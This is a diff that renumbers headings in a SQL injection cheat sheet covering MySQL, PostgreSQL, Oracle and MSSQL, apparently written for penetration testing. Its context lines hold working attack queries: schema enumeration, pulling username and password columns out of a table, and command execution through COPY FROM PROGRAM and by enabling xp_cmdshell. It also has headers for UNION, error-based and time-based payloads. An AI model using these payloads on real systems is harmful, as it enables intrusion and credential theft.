@@ -2,49 +2,49 @@
 
 ## 1. MySQL (Reference)
 
-## 1.1 List all Databases
+### 1.1 List all Databases
 
 ```sql
 SELECT schema_name FROM information_schema.schemata;
 ```
 
-**List all tables in the current DB:**
+### 1.2 List all tables in the current DB
 
 ```sql
 SELECT table_name FROM information_schema.tables WHERE table_schema=database();
 ```
 
-**List all tables from a different DB:**
+### 1.3 List all tables from a different DB
 
 ```sql
 SELECT table_name FROM information_schema.tables WHERE table_schema='app';
 ```
 
-**List all columns in the current DB:**
+### 1.4 List all columns in the current DB
 
 ```sql
 SELECT column_name FROM information_schema.columns WHERE table_name='test_table';
 ```
 
-**List all columns in a different DB:**
+### 1.5 List all columns in a different DB
 
 ```sql
 SELECT column_name FROM information_schema.columns WHERE table_schema='app' AND table_name='test_table';
 ```
 
-**Extract records from chosen columns (current DB):**
+### 1.6 Extract records from chosen columns (current DB)
 
 ```sql
 SELECT GROUP_CONCAT(user,'@@',passwd) FROM test_table;
 ```
 
-**Extract records from a different DB:**
+### 1.7 Extract records from a different DB
 
 ```sql
 SELECT GROUP_CONCAT(user,'@@',passwd) FROM app.test_table;
 ```
 
-**MySQL Specific - Useful functions:**
+### 1.8 MySQL Specific - Useful functions
 
 ```sql
 -- Current user
@@ -68,9 +68,9 @@ COPY cmd_output FROM PROGRAM 'id';
 ```
 ---
 
-## PostgreSQL
+## 2. PostgreSQL
 
-**List all Databases:**
+### 2.1 List all Databases
 
 ```sql
 SELECT datname FROM pg_database;
@@ -78,7 +78,7 @@ SELECT datname FROM pg_database;
 SELECT schema_name FROM information_schema.schemata;
 ```
 
-**List all tables in the current DB/schema:**
+### 2.2 List all tables in the current DB/schema
 
 ```sql
 SELECT table_name FROM information_schema.tables WHERE table_schema='public';
@@ -86,25 +86,25 @@ SELECT table_name FROM information_schema.tables WHERE table_schema='public';
 SELECT tablename FROM pg_tables WHERE schemaname='public';
 ```
 
-**List all tables from a different schema:**
+### 2.3 List all tables from a different schema
 
 ```sql
 SELECT table_name FROM information_schema.tables WHERE table_schema='app';
 ```
 
-**List all columns in a table:**
+### 2.4 List all columns in a table
 
 ```sql
 SELECT column_name FROM information_schema.columns WHERE table_name='test_table';
 ```
 
-**List all columns in a different schema:**
+### 2.5 List all columns in a different schema
 
 ```sql
 SELECT column_name FROM information_schema.columns WHERE table_schema='app' AND table_name='test_table';
 ```
 
-**Extract records from chosen columns (current schema):**
+### 2.6 Extract records from chosen columns (current schema)
 
 ```sql
 SELECT STRING_AGG(user || '@@' || passwd, ',') FROM test_table;
@@ -112,13 +112,13 @@ SELECT STRING_AGG(user || '@@' || passwd, ',') FROM test_table;
 SELECT user || '@@' || passwd FROM test_table;
 ```
 
-**Extract records from a different schema:**
+### 2.7 Extract records from a different schema
 
 ```sql
 SELECT STRING_AGG(user || '@@' || passwd, ',') FROM app.test_table;
 ```
 
-**PostgreSQL Specific - Useful functions:**
+### 2.8 PostgreSQL Specific - Useful functions
 
 ```sql
 -- Current user
@@ -143,9 +143,9 @@ COPY cmd_output FROM PROGRAM 'id';
 
 ---
 
-## Oracle
+## 3. Oracle
 
-**List all Databases (Tablespaces):**
+### 3.1 List all Databases (Tablespaces)
 
 ```sql
 SELECT tablespace_name FROM dba_tablespaces;
@@ -153,7 +153,7 @@ SELECT tablespace_name FROM dba_tablespaces;
 SELECT username FROM all_users;
 ```
 
-**List all tables accessible to current user:**
+### 3.2 List all tables accessible to current user
 
 ```sql
 SELECT table_name FROM all_tables WHERE owner=USER;
@@ -161,25 +161,25 @@ SELECT table_name FROM all_tables WHERE owner=USER;
 SELECT table_name FROM all_tables;
 ```
 
-**List all tables from a different schema:**
+### 3.3 List all tables from a different schema
 
 ```sql
 SELECT table_name FROM all_tables WHERE owner='APP';
 ```
 
-**List all columns in a table:**
+### 3.4 List all columns in a table
 
 ```sql
 SELECT column_name FROM all_tab_columns WHERE table_name='TEST_TABLE';
 ```
 
-**List all columns in a different schema:**
+### 3.5 List all columns in a different schema
 
 ```sql
 SELECT column_name FROM all_tab_columns WHERE owner='APP' AND table_name='TEST_TABLE';
 ```
 
-**Extract records from chosen columns (current schema):**
+### 3.6 Extract records from chosen columns (current schema)
 
 ```sql
 SELECT LISTAGG(username || '@@' || passwd, ',') WITHIN GROUP (ORDER BY username) FROM test_table;
@@ -187,13 +187,13 @@ SELECT LISTAGG(username || '@@' || passwd, ',') WITHIN GROUP (ORDER BY username)
 SELECT username || '@@' || passwd FROM test_table;
 ```
 
-**Extract records from a different schema:**
+### 3.7 Extract records from a different schema
 
 ```sql
 SELECT username || '@@' || passwd FROM app.test_table;
 ```
 
-**Oracle Specific - Useful queries:**
+### 3.8 Oracle Specific - Useful queries
 
 ```sql
 -- Current user
@@ -227,9 +227,9 @@ SELECT 'test' FROM dual;
 
 ---
 
-## Microsoft SQL Server (MSSQL)
+## 4. Microsoft SQL Server (MSSQL)
 
-**List all Databases:**
+### 4.1 List all Databases
 
 ```sql
 SELECT name FROM master.sys.databases;
@@ -239,7 +239,7 @@ SELECT name FROM sys.databases;
 EXEC sp_databases;
 ```
 
-**List all tables in the current DB:**
+### 4.2 List all tables in the current DB
 
 ```sql
 SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE';
@@ -247,7 +247,7 @@ SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE';
 SELECT name FROM sys.tables;
 ```
 
-**List all tables from a different DB:**
+### 4.3 List all tables from a different DB
 
 ```sql
 SELECT table_name FROM app.information_schema.tables WHERE table_type='BASE TABLE';
@@ -255,7 +255,7 @@ SELECT table_name FROM app.information_schema.tables WHERE table_type='BASE TABL
 SELECT name FROM app.sys.tables;
 ```
 
-**List all columns in the current DB:**
+### 4.4 List all columns in the current DB
 
 ```sql
 SELECT column_name FROM information_schema.columns WHERE table_name='test_table';
@@ -263,13 +263,13 @@ SELECT column_name FROM information_schema.columns WHERE table_name='test_table'
 SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('test_table');
 ```
 
-**List all columns in a different DB:**
+### 4.5 List all columns in a different DB
 
 ```sql
 SELECT column_name FROM app.information_schema.columns WHERE table_name='test_table';
 ```
 
-**Extract records from chosen columns (current DB):**
+### 4.6 Extract records from chosen columns (current DB)
 
 ```sql
 SELECT STRING_AGG(username + '@@' + passwd, ',') FROM test_table;
@@ -279,13 +279,13 @@ SELECT username + '@@' + passwd FROM test_table;
 SELECT STUFF((SELECT ',' + username + '@@' + passwd FROM test_table FOR XML PATH('')), 1, 1, '');
 ```
 
-**Extract records from a different DB:**
+### 4.7 Extract records from a different DB
 
 ```sql
 SELECT username + '@@' + passwd FROM app.dbo.test_table;
 ```
 
-**MSSQL Specific - Useful queries:**
+### 4.8 MSSQL Specific - Useful queries
 
 ```sql
 -- Current user
@@ -323,7 +323,7 @@ EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  select * from app.sys.tables;
 ```
 
-**MSSQL - Stacked Queries:**
+### 4.9 MSSQL - Stacked Queries
 
 ```sql
 -- MSSQL supporte les stacked queries (;)
@@ -336,7 +336,7 @@ SELECT 1; SELECT 2;
 ---
 ---
 
-## Quick Reference Table
+## 5. Quick Reference Table
 
 | Action                     | MySQL                          | PostgreSQL             | Oracle               | MSSQL                   |
 | -------------------------- | ------------------------------ | ---------------------- | -------------------- | ----------------------- |
@@ -354,7 +354,7 @@ SELECT 1; SELECT 2;
 ---
 ---
 
-## UNION-Based Injection - Column Count Discovery
+## 6. UNION-Based Injection - Column Count Discovery
 
 **MySQL / PostgreSQL / MSSQL:**
 
@@ -380,7 +380,7 @@ SELECT 1; SELECT 2;
 
 ---
 
-## Error-Based Injection Payloads
+## 7. Error-Based Injection Payloads
 
 **MySQL:**
 
@@ -411,7 +411,7 @@ SELECT 1; SELECT 2;
 
 ---
 
-## Time-Based Blind Injection
+## 8. Time-Based Blind Injection
 
 **MySQL:**
 
